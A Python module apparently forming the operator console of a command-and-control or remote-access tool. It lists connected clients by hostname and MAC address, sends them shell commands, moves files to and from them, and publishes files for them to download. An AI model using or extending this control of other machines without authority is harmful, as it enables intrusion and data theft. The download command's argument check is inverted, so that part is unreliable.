import os

def _require_client(current_client):
    if not current_client:
        print("no client selected")
        return False

    return True

def _require_args(args, usage, count=1):
    if len(args) < count:
        print(f"usage: {usage}")
        return False

    return True

def cmd_use(server, args, current_client):
    if not _require_args(args, "use <client_id>"):
        return current_client

    cid = args[0]

    if cid not in server.clients:
        print("unknow client")
        return current_client

    print (f"selected {cid}")
    return cid

def cmd_users(server, args, current_client):
    if not server.clients:
        print("[+] no clients")
        return current_client

    print()
    for cid, c in server.clients.items():
        marker = "*" if cid == current_client else " "
        print(f"{marker} {cid} | {c['hostname']} | {c['mac']}")
    print()
    
    return current_client

def cmd_health(server, args, current_client):
    if not _require_client(current_client):
        return current_client
    
    server.send_task(current_client, "health", {})
    return current_client

def cmd_shell(server, args, current_client):
    if not _require_client(current_client):
        return current_client
    
    cmd = " ".join(args) if args else input("$ ")
    if not cmd:
        return current_client
          
    server.send_task(current_client, "shell", {"cmd": cmd})
    return current_client

def cmd_upload(server, args, current_client):
    if not _require_client(current_client):
        return current_client

    if not _require_args(args, "usage: upload <server_path> <client_path>", count=2):    
        return current_client

    try:
        server.upload_file(current_client, args[0], args[1])
    except FileNotFoundError:
        print(f"file not found: {args[0]}")

    return current_client

def cmd_download(server, args, current_client):
    if not _require_client(current_client):
        return current_client
    
    if _require_args(args, "usage: download <client_path> <server_path>", count=2):
        return current_client
    
    server.download_file(current_client, args[0], args[1])
    return current_client

def cmd_results(server, args, current_client):
    if not _require_client(current_client):
        return current_client

    results = server.clients[current_client]["results"]

    if not results:
        print(" no results")
        return current_client

    for i, (tid, r) in enumerate(results.items(), 1):
        out = r["output"]
        print(f"\n [{i}] {tid[:8]} [{r['status']}]")
        output = out["stdout"] if r["status"] == "ok" else out["stderr"]
        if output: print(f" {output.strip()}")
    
    print()
    return current_client

def cmd_publish(server, args, current_client):
    if not _require_args(args, "publish <file>"):
        return current_client
    
    try:
        name = server.publish(args[0])
        print(f"{name} allowed to download. [default endpoint: http://ADDRESS:PORT/downloads/{name}]")
    except Exception as e:
        print(f"error: {e}")

    return current_client

def cmd_disconnect(server, args, current_client):
    if not _require_client(current_client): 
        return current_client
    
    server.disconnect(current_client)
    return None

def cmd_clear(server, args, current_client):
    os.system("cls" if os.name == "nt" else "clear")
    return current_client

def cmd_help(server, args, current_client):
    for name, (_, desc) in COMMANDS.items():
        print(f"{name:<12} {desc}")
    return current_client

COMMANDS = {    
    "use":        (cmd_use,         "select a client - use <client_id>"),
    "users":      (cmd_users,       "list connected clients"),
    "disconnect": (cmd_disconnect,  "disconnect selected client"),
    "health":     (cmd_health,      "check client health\n"),

    "shell":      (cmd_shell,       "execute a shell command - shell <cmd>"),
    "upload":     (cmd_upload,      "send file to client - upload <src> <dst>"),
    "download":   (cmd_download,    "download file from client - download <src> <dst>"),
    "publish":    (cmd_publish,     "publish file on http endpoint for download - publish <path>\n"),

    "results":    (cmd_results,     "show task results"),
    "help":       (cmd_help,        "show this message"),
    "clear":      (cmd_clear,       "clear the terminal"),
}
